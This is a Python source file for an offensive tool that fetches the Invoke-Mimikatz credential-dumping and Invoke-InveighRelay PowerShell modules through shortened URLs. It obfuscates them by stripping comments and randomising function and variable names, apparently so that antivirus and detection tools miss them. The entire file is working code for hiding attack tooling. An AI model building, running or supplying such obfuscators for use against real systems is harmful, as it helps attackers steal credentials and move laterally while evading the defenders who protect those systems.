#!/usr/bin/python

import os, sys, re, random, argparse
import requests, OpenSSL, string

from argparse import RawTextHelpFormatter
from classes.bcolours import *

#
# Invoke-mimikatz.ps1 obfuscator 
# Download Mimikatz Powershell module, change variable names, remove comments etc.
# pip install requests==2.11.1

# Global variables:
__author__		= "Steven McElrea (loneferret)"
__license__		= "Apache License 2.0"
__version__		= "0.1.1"
__status__		= "Prototype"

#MIMIURL = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
#INVEIGHRELAY = 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-InveighRelay.ps1'

MIMIURL = 'https://goo.gl/TRkLKn'
INVEIGHRELAY = 'https://goo.gl/1507jm'
TEST = 'http://127.0.0.1:8000/test.ps1'
MIMI = ''

IGNORE = ['$true','$false','Main','Invoke','$True','$False','$_','$args','$Bytes','Get','$ExeArgs', '$Win32Constants','Win32Constants','Win32Functions','$Win32Functions',
			'Get-PEBasicInfo','$PEBytes', '$PEHandle','PEHandle','$PELoadedInfo','ExeArgs','$Win32Types','Win32Types','PEInfo','$PEInfo','$StartAddress','StartAddress',
			'Size','$Size','$OriginalImageBase','OriginalImageBase']


"""
TODO:
High: 
- Change variable names: Almost done 
- Fine tune the comments regex

"""

def writeNewFile(newContent):
	# Writes the file Powershell file
	newPSH = file('obfuscated.ps1', 'w')
	for i in newContent:
		newPSH.write(str(i)+"\n")

	return True

def removeEmptyLines(content):
	# Remove empty lines

	newlines = []
	for i in content:
		if(i.strip()):
			newlines.append(i)
		else:
			continue

	return newlines

def makeRandom(size=8, chars=string.ascii_uppercase + string.ascii_lowercase):
	# http://stackoverflow.com/questions/2257441/random-string-generation-with-upper-case-letters-and-digits-in-python
	return ''.join(random.choice(chars) for _ in range(size))

def replaceFunctionCalls(content, oldName, newName):
	# Searches the file to replace original function names with new name
	newlines = []
	for line in content:
		if(oldName.endswith(')')):
			newlines.append(line.replace(oldName, newName+'()'))
		else:
			newlines.append(line.replace(oldName, newName))

	return newlines

def checkIgnoreWords(wordcheck):
	# lazy ass way 
	result = True
	for word in IGNORE:
		if word in wordcheck:
			result = False
			break
	return result

def getFunctionNames(content):
	# Searches for Function names then finds & replaces with random string
	replaceList = {}
	newlines = []
	for i in content:
		pattern = re.search('^\s*[f|F]unction\s(.*\w$)', i)
		if (pattern):
			if (checkIgnoreWords(pattern.group(1))):
				functionName = pattern.group(1)
				newName = makeRandom()
				replaceList[functionName] = newName
				if(functionName.endswith(')')): 
					parenValues = re.search('\((.+)\)', functionName) # \((.+)\) <-- regex to find (...)
					if(parenValues not in IGNORE):
						newlines.append(i.replace(functionName,newName+'('+parenValues.group(1)+')'))
					else:
						newlines.append(i.replace(functionName,newName+'()'))
				else:
					newlines.append(i.replace(functionName,newName))

			else:
				newlines.append(i)
		else:
			newlines.append(i)
	return newlines, replaceList

def deleteLines(start, end, content):
	# Delete lines between start & end inclusively
	newLines = []	# just easier using a list for the moment
	for i, line in enumerate(content):
		if (i < (start - 1)):
			newLines.append(line)
			#print line
			continue
		elif (i >= end):
			newLines.append(line)
			#print line
			continue
		else:
			continue

	return newLines

def removeComments(content):
	# Needs a better regex
	newlines = []
	for i in content:
		if (re.search('^[\s+|\t+]#', i.rstrip())):
			continue
		else:
			newlines.append(i)

	return newlines	

def removeBlockComments(mimi):
	# Removes commented lines from Invoke-Mimikatz.ps1
	mimiLines = mimi.splitlines()
	commentsRemoved = ''
	first = 0
	second = 0
	for num, line in enumerate(mimiLines, 1):
		if (line.startswith('<#')):
			first = num
		if (line.startswith('#>')):
			second = num

	commentsRemoved = deleteLines(first, second, mimiLines)
	return commentsRemoved

def replaceVariableNames(content, oldName, newName):
	# Replaces variable names with new ones
	newlines = []
	for line in content:
			newlines.append(line.replace(oldName, "$"+newName))

	return newlines

def getVariablesNames(content):
	# Change variable names
	replaceList = {}
	temp = []
	newlines = []
	for i in content:
		pattern = re.search('(\$\w+)[-\s=|\s=]', i)
		if((pattern) and pattern.group(1) not in IGNORE):
			#print pattern.group(1)
			temp.append(pattern.group(1))

	for i in set(temp):
		replaceList[i] = makeRandom()
		#print "$"+i + " $" + replaceList[i]

	return replaceList

def getTargetPSH(url):
	# Download Mimikatz for treatement
	orgPSH = requests.get(url, stream=True)
	orgPSH.raw.decode_content = True
	return orgPSH.content

def printUsage():
	usage = '\n'
	usage += ("Example Usage: \n")
	usage += ("\t" + sys.argv[0] + " --psh InveighRelay\n")
	usage += ("\t" + sys.argv[0] + " -p Mimikatz\n")
	return usage

def description():
	desc = "\n"
	desc += ("Simple & Convoluted Powershell obfuscation tool  v%s: \n" % __version__)
	desc += ("Grabs a Powershell script from Github, remplaces function names & calls\n")
	desc += ("To randomly generated string, and removes block comments & empty lines.\n")
	desc += ("\t* Currently only changes function name.\n\n")
	desc += ("Author: %s \n" % __author__)
	desc += ("License: %s \n" % __license__)
	desc += ("Status: %s \n" % __status__)
	desc += printUsage()
	return desc

def main():
	global NUMFUNCTIONNAMES, NUMVARIABLES

	parser = argparse.ArgumentParser(description=description(), formatter_class=RawTextHelpFormatter)
	parser.add_argument('--psh', '-p', dest='pshScript', required=True, help='Available scripts to download:\n- Mimikatz\n- InveighRelay')

	args = parser.parse_args()

	newFunctionName = raw_input("What name do you want the main function to be called [default is random]:") or makeRandom()
	if(args.pshScript == 'Mimikatz'):
		url = MIMIURL
	elif(args.pshScript == 'InveighRelay'):
		url = INVEIGHRELAY
	else:
		url = raw_input("Enter URL [http://127.0.0.1:8000/test.ps1]: ") or TEST

	MIMI = getTargetPSH(url)
	MIMI = removeBlockComments(MIMI)
	MIMI = removeEmptyLines(MIMI)
	MIMI = removeComments(MIMI)
	
	MIMI, dictListFunctions = getFunctionNames(MIMI)
	for key in dictListFunctions:
		MIMI = replaceFunctionCalls(MIMI, key, dictListFunctions[key])
	
	dictListVars = getVariablesNames(MIMI)
	for key in dictListVars:
		MIMI = replaceVariableNames(MIMI, key, dictListVars[key])

	MIMI = replaceFunctionCalls(MIMI, 'Invoke-'+args.pshScript, 'Invoke-' + newFunctionName)
	print("Number of functions renamed: " + bcolours.GREEN + str(len(dictListFunctions)) + bcolours.ENDC)
	print("Number of variables renamed: " + bcolours.GREEN + str(len(dictListVars)) + bcolours.ENDC)
	print("Fetching from: " + bcolours.GREEN + url + bcolours.ENDC) 
	print("New function name: " + bcolours.GREEN + "Invoke-"+newFunctionName+bcolours.ENDC + "\n")
	writeNewFile(MIMI)



if __name__ == '__main__':
	# start
	main()
